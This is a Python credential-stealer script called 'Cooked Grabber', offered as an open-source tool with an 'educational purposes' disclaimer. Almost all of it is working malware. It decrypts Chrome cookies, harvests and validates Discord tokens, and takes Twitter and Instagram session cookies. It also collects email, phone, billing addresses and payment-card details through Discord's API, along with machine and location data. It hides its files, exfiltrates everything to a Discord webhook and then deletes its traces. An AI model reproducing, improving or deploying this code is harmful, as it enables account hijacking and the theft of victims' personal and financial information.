#python 3.8
#Cooked Grabber by H4X0R TEAM
#Github project link : https://github.com/h4x0r-project/CookedGrabber/
#Devs: Lemon (https://github.com/mouadessalim) ; crashixx (https://github.com/crashixx) 
#Only for educational purposes

#modules
import os
from concurrent.futures import thread
from json import loads
from base64 import b64decode
from sqlite3 import connect
from shutil import copyfile
from datetime import datetime, timedelta
from threading import Thread
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from discord_webhook import DiscordWebhook
from subprocess import Popen, PIPE
from urllib.request import urlopen, Request
from requests import get, post
from random import randint
from re import findall
import win32con
from win32api import SetFileAttributes

#your webhook (you can enter your webhook)
webhook_link = ""
#website selection (do not change for the good functioning of the system)
website = ['twitter.com', 'discord.com', 'instagram.com']

#hwid grabber (serial number)
def get_hwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

#user data grabber (use discord user_data api)
def get_user_data(tk):
    headers = {'Authorization': tk}
    response = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    return [response['username'], response['discriminator'], response['email'], response['phone']]

#token checker (method 1, use discord login api)
def variant1(token):
    response = get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})
    return True if response.status_code == 200 else False

#token checker (method 2, use discord invitation api)
def variant2(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
        return False
    else:
        return True

#payment method grabber (use discord payment source api)
def has_payment_methods(tk):
    headers = {'Authorization': tk}
    response=get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',  headers=headers).json()
    return response

#cookies grabber
def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = loads(local_state)

    key = b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""
        
#main code 
def main():
    filename = "Cookies.db"
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    if not os.path.isfile(filename):
        copyfile(db_path, filename)
        SetFileAttributes(filename,win32con.FILE_ATTRIBUTE_HIDDEN)
    db = connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    logon_twitter = ''
    logon_instagram = "INSTAGRAM INFO:\n\n"
    for x in website:
        if x == 'discord.com':
            path_chrome = f"{os.getenv('LOCALAPPDATA')}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
            path_discord = f"{os.getenv('APPDATA')}\\Discord\\Local Storage\\leveldb"
            tokens = []
            #discord token grabber
            def discord_tokens(path):
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in findall(regex, line):
                                #token checker
                                if token not in tokens:
                                    if variant2(token) == True:
                                        tokens.append(token)
                                                                
                                    elif variant1(token) == True:
                                        tokens.append(token)
            #token classifier
            if os.path.exists(path_discord):
                threads = []
                th1 = Thread(target=discord_tokens, args=(path_discord,))
                th2 = Thread(target=discord_tokens, args=(path_chrome,))
                threads.append(th1)
                threads.append(th2)
                for t in threads:
                    t.start()
                for t in threads:
                    t.join()
            else:
                discord_tokens(path_chrome)
            final_tokens = ''
            for n in tokens:
                final_tokens += f"- {n}\n"
            logon_discord = f"""=====================================================\nDISCORD INFO:\n\nHost: {x}\nCookie name: TOKEN\nCookie value [discord token(s)]:\n\n{final_tokens}====================================================="""
        else:
            cursor.execute(f"""
            SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
            FROM cookies WHERE host_key like '%{x}%'""")
            key = get_encryption_key()
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                if not value:
                    decrypted_value = decrypt_data(encrypted_value, key)
                else:
                    decrypted_value = value
                if x == 'twitter.com'and name == 'auth_token':
                    logon_twitter += f"""TWITTER INFO:\n\nHost: {host_key}\nCookie name: {name}\nCookie value [twitter authentification key]: {decrypted_value}\n====================================================="""
                    break
                elif x == 'instagram.com':
                    if name == 'sessionid' or name =='ds_user_id':
                        logon_instagram += f"""Host: {host_key}\nCookie name: {name}\nCookie value [instagram authentification key]: {decrypted_value}\n=====================================================\n"""
    hwid = get_hwid()
    pc_username = os.getenv('UserName')
    pc_name = os.getenv('COMPUTERNAME')
    #get ip, country, city
    try:
        ip_address=urlopen(Request('https://api64.ipify.org')).read().decode().strip()
        country=urlopen(Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
        city=urlopen(Request(f'https://ipapi.co/{ip_address}/city')).read().decode().strip()
    except:
        city="City not found -_-"
        country="Country not found -_-"
        ip_address="No IP found -_-"
    Personnal_info = f"**PC name:** `{pc_name}`\n**Pc username:** `{pc_username}`\n**Ip Adress:** `{ip_address}`\n**Country:** `{country}`\n**City:** `{city}`\n**HWID:** `{hwid}`"
    #cookies expirations changer (makes sure cookies never expire)
    cursor.execute("""
    UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
    WHERE host_key = ?
    AND name = ?""", (decrypted_value, host_key, name))
    #data writer in file : Cooked_data.txt
    with open(f"Cooked_data.txt", "a") as f:
        SetFileAttributes('Cooked_data.txt',win32con.FILE_ATTRIBUTE_HIDDEN)
        data = (f"{logon_discord}\n{logon_twitter}\n{logon_instagram}")
        print(1)
        f.write(data)
    all_data, all_data_p, lst, lst_b = [], [], '', ''
    #discord tokens personnal informations grabber 
    for x in tokens:
        try:
            lst = get_user_data(x)
            username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
            if [username, email, phone] not in all_data:
                all_data.append([username, email, phone]) 
        except: 
            pass
        lst_b = has_payment_methods(x)
        try:
            #payment methods grabber 
            for n in range(len(lst_b)):
                if lst_b[n]['type'] == 1:
                    writable = [lst_b[n]['brand'], lst_b[n]['type'], lst_b[n]['last_4'], lst_b[n]['expires_month'], lst_b[n]['expires_year'], lst_b[n]['billing_address']]
                    if writable not in all_data_p:
                        all_data_p.append(writable)
                elif lst_b[n]['type'] == 2:
                    writable_2 = [lst_b[n]['email'], lst_b[n]['type'], lst_b[n]['billing_address']]
                    if writable_2 not in all_data_p:
                        all_data_p.append(writable_2)
        except:
            pass
    #file writer 
    with open(f"Cooked_data.txt", "a") as f:
        f.write("DISCORD ACCOUNT INFO FOUNDED:\n\n")
        for g in all_data:
            f.write(f"""\nPseudo: {all_data[all_data.index(g)][0]}\nDiscord email: {all_data[all_data.index(g)][1]}\nDiscord phone num: {all_data[all_data.index(g)][2]}
            \n=====================================================""")
        def discord_info_w(x, y):
            f.write(f"""Billings Adress:\n{all_data_p[x][y]['name']}\n{all_data_p[x][y]['line_1']}\n{all_data_p[x][y]['line_2']}
            \nCity and state: {all_data_p[x][y]['city']} - {all_data_p[x][y]['state']}\nCountry: {all_data_p[x][y]['country']}\nPostal Code: {all_data_p[x][y]['postal_code']}
            \n=====================================================\n""")
        f.write("\nDISCORD PAYMENT INFO FOUNDED:\n")
        for b in all_data_p:
            m = all_data_p.index(b)
            if all_data_p[m][1] == 1:
                f.write(f"Provider: {all_data_p[m][0]}\nLast_4: {all_data_p[m][2]}\nExpire: {all_data_p[m][3]}/{all_data_p[m][4]}\n-------------------------------\n")
                discord_info_w(m, 5)
            elif all_data_p[m][1] == 2:
                f.write(f"Email (Paypal) {all_data_p[m][0]}\n-------------------------------\n")
                discord_info_w(m, 2)
    #webhook sender (you can change : avatar_url and username)
    webhook = DiscordWebhook(url=webhook_link, content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
    with open("Cooked_data.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename='data.txt')
    webhook.execute()
    db.commit()
    db.close()
    try:
        os.remove('Cookies.db')
        os.remove('Cooked_data.txt')
    except:
        pass
if __name__ == "__main__":
    main()
